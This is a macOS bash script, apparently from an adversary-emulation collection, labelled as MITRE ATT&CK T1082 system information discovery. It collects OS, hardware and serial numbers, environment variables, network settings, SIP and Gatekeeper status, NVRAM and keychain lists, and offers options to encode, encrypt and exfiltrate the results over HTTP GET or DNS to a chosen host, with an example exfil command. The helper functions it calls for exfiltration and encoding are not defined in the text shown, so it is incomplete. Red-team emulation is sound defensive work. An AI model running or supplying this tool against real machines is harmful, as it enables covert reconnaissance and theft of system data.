
# Script Name: system_info.sh
# MITRE ATT&CK Technique: T1082 - System Information Discovery
# Tactic: Discovery
# Platform: macOS

# Author: @darmado x.com/darmad0
# Date: $(date +%Y-%m-%d)
# Version: 1.0

# Description:
# This script discovers detailed system information on macOS systems using native commands.
# It gathers hardware details, OS information, and environment data that could be valuable
# for system enumeration and post-exploitation activities.

# References:
# - https://attack.mitre.org/techniques/T1082/
# - https://developer.apple.com/documentation/systemconfiguration
# - https://support.apple.com/guide/remote-desktop/about-system-information-apd0e7bcf4c/mac

# Global Variables
NAME="system_info"
TACTIC="discovery"
TTP_ID="T1082"
LOG_FILE="${TTP_ID}_${NAME}.log"
USER=""

# Command Variables
CMD_SW_VERS="sw_vers"
CMD_UNAME="uname -a"
CMD_SYSTEM_PROFILER="system_profiler"
CMD_SYSCTL="sysctl"
CMD_IOREG="ioreg"
CMD_DEFAULTS="defaults"
CMD_NVRAM="nvram -xp"
CMD_CSRUTIL="csrutil status"
CMD_SPCTL="spctl --status"
CMD_SECURITY="security"

# Display help message
display_help() {
    cat << 'EOF'
Usage: $0 [OPTIONS]

Description:
  Discovers detailed system information on macOS systems using native commands.

Options:
  General:
    -h, --help              Display this help message
    -v, --verbose           Enable verbose output
    -a, --all              Run all system checks

  Information Categories:
    -s, --system           Basic system information (OS, version, build)
    -H, --hardware         Hardware information (CPU, memory, serial numbers)
    -e, --env              Environment variables and settings
    -n, --network          Network configuration
    -b, --boot             Boot and security settings
    -p, --power           Power and battery information

  Output Manipulation:
    --encode=TYPE          Encode output (b64|hex|uuencode|perl_b64|perl_utf8)
    --exfil=URI           Exfiltrate output to URI using HTTP GET
    --exfil=dns=DOMAIN    Exfiltrate output via DNS queries to DOMAIN (Base64 encoded)
    --encrypt=METHOD      Encrypt output (aes|blowfish|gpg). Generates a random key.
    --log                 Enable logging of output to a file

Examples:
  $0 -a                    Run all system information checks
  $0 -s -H                 Get system and hardware information
  $0 -e --encode=b64       Get environment info and encode in base64
  $0 -a --exfil=http://example.com  Get all info and exfiltrate

Note: Some checks may require elevated privileges for full information.
EOF
}

# Get current user
get_user() {
    USER=$(whoami)
}

# Function to get timestamp
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

# System information functions
check_basic_system_info() {
    local output=""
    
    output+="[$(get_timestamp)]: user: $USER; msg: Basic System Information\n"
    output+="OS Version:\n$($CMD_SW_VERS 2>/dev/null)\n"
    output+="Kernel Information:\n$($CMD_UNAME 2>/dev/null)\n"
    output+="Host Information:\n$(hostname -f 2>/dev/null)\n"
    
    echo -e "$output"
}

check_hardware_info() {
    local output=""
    
    output+="[$(get_timestamp)]: user: $USER; msg: Hardware Information\n"
    
    # CPU Info
    output+="CPU Information:\n"
    output+="$($CMD_SYSCTL -n machdep.cpu.brand_string 2>/dev/null)\n"
    output+="$($CMD_SYSCTL -n hw.ncpu 2>/dev/null) processors\n"
    
    # Memory Info
    output+="Memory Information:\n"
    output+="$($CMD_SYSCTL -n hw.memsize 2>/dev/null) bytes total\n"
    
    # Hardware Model
    output+="Hardware Model:\n"
    output+="$($CMD_SYSTEM_PROFILER SPHardwareDataType 2>/dev/null | grep 'Model Name\|Model Identifier\|Serial Number' 2>/dev/null)\n"
    
    # Storage Info
    output+="Storage Information:\n"
    output+="$($CMD_SYSTEM_PROFILER SPStorageDataType 2>/dev/null | grep -A 5 'Physical Drive' 2>/dev/null)\n"
    
    echo -e "$output"
}

check_environment_info() {
    local output=""
    
    output+="[$(get_timestamp)]: user: $USER; msg: Environment Information\n"
    
    # Environment Variables
    output+="Environment Variables:\n"
    output+="$(env 2>/dev/null | grep -v 'PASSWORD\|KEY\|SECRET\|TOKEN' 2>/dev/null)\n"
    
    # Locale Settings
    output+="Locale Settings:\n"
    output+="$(locale 2>/dev/null)\n"
    
    # Time Zone
    output+="Time Zone Information:\n"
    output+="$(systemsetup -gettimezone 2>/dev/null)\n"
    
    echo -e "$output"
}

check_network_config() {
    local output=""
    
    output+="[$(get_timestamp)]: user: $USER; msg: Network Configuration\n"
    
    # Network Interfaces
    output+="Network Interfaces:\n"
    output+="$(ifconfig 2>/dev/null)\n"
    
    # DNS Configuration
    output+="DNS Configuration:\n"
    output+="$(scutil --dns 2>/dev/null)\n"
    
    # Routing Table
    output+="Routing Table:\n"
    output+="$(netstat -rn 2>/dev/null)\n"
    
    echo -e "$output"
}

check_boot_security() {
    local output=""
    
    output+="[$(get_timestamp)]: user: $USER; msg: Boot and Security Settings\n"
    
    # SIP Status
    output+="System Integrity Protection Status:\n"
    output+="$($CMD_CSRUTIL 2>/dev/null)\n"
    
    # Gatekeeper Status
    output+="Gatekeeper Status:\n"
    output+="$($CMD_SPCTL 2>/dev/null)\n"
    
    # NVRAM Variables
    output+="NVRAM Variables:\n"
    output+="$($CMD_NVRAM 2>/dev/null)\n"
    
    # Security Settings
    output+="Security Settings:\n"
    output+="$($CMD_SECURITY list-keychains 2>/dev/null)\n"
    
    echo -e "$output"
}

check_power_info() {
    local output=""
    
    output+="[$(get_timestamp)]: user: $USER; msg: Power Information\n"
    
    # Power Status
    output+="Power Status:\n"
    output+="$($CMD_SYSTEM_PROFILER SPPowerDataType 2>/dev/null)\n"
    
    # Battery Info (if present)
    output+="Battery Information:\n"
    output+="$($CMD_IOREG -rn AppleSmartBattery 2>/dev/null)\n"
    
    echo -e "$output"
}

# Initialize variables
VERBOSE=false
ALL=false
SYSTEM=false
HARDWARE=false
ENV=false
NETWORK=false
BOOT=false
POWER=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
LOG_ENABLED=false

# Parse command-line arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help)
            display_help
            exit 0
            ;;
        -v|--verbose)
            VERBOSE=true
            ;;
        -a|--all)
            ALL=true
            ;;
        -s|--system)
            SYSTEM=true
            ;;
        -H|--hardware)
            HARDWARE=true
            ;;
        -e|--env)
            ENV=true
            ;;
        -n|--network)
            NETWORK=true
            ;;
        -b|--boot)
            BOOT=true
            ;;
        -p|--power)
            POWER=true
            ;;
        --encode=*)
            ENCODE="${1#*=}"
            ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${1#*=}"
            if [[ "$EXFIL_METHOD" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${1#*=dns=}"
            else
                EXFIL_METHOD="http"
                EXFIL_URI="${1#*=}"
            fi
            ;;
        --encrypt=*)
            ENCRYPT="${1#*=}"
            ENCRYPT_KEY=$(generate_random_key)
            if [ "$VERBOSE" = true ]; then
                echo "Generated encryption key: $ENCRYPT_KEY"
            fi
            ;;
        --log)
            LOG_ENABLED=true
            ;;
        *)
            echo "Invalid option: $1" >&2
            display_help
            exit 1
            ;;
    esac
    shift
done

# Main function
main() {
    local output=""          # Variable to hold unencoded output
    local encoded_output=""  # Variable to hold encoded output

    # Setup logging if enabled
    if [ "$LOG_ENABLED" = true ]; then
        create_log
    fi

    # Run the get_user function to set the USER global variable
    get_user

    # Handle all system information checks and capture output
    if [ "$ALL" = true ] || [ "$SYSTEM" = true ]; then
        output+="$(check_basic_system_info)\n"
    fi

    if [ "$ALL" = true ] || [ "$HARDWARE" = true ]; then
        output+="$(check_hardware_info)\n"
    fi

    if [ "$ALL" = true ] || [ "$ENV" = true ]; then
        output+="$(check_environment_info)\n"
    fi

    if [ "$ALL" = true ] || [ "$NETWORK" = true ]; then
        output+="$(check_network_config)\n"
    fi

    if [ "$ALL" = true ] || [ "$BOOT" = true ]; then
        output+="$(check_boot_security)\n"
    fi

    if [ "$ALL" = true ] || [ "$POWER" = true ]; then
        output+="$(check_power_info)\n"
    fi

    # Handle output processing
    if [ "$LOG_ENABLED" = true ]; then
        if [ "$ENCODE" != "none" ]; then
            encoded_output=$(encode_output "$output")
            log_and_append "[$(get_timestamp)]: $encoded_output"
        else
            log_and_append "$output"
        fi
    else
        if [ "$ENCODE" != "none" ]; then
            encoded_output=$(encode_output "$output")
            echo -e "$encoded_output"
        else
            echo -e "$output"
        fi
    fi

    # Handle exfiltration if enabled
    if [ "$EXFIL" = true ]; then
        local data_to_exfil
        if [ "$ENCODE" != "none" ]; then
            data_to_exfil="$encoded_output"
        else
            data_to_exfil="$output"
        fi

        case "$EXFIL_METHOD" in
            http)
                exfiltrate_http "$data_to_exfil" "$EXFIL_URI"
                ;;
            dns)
                exfiltrate_dns "$data_to_exfil" "$EXFIL_URI" "sysinfo"
                ;;
        esac
    fi
}

# Run main function
main 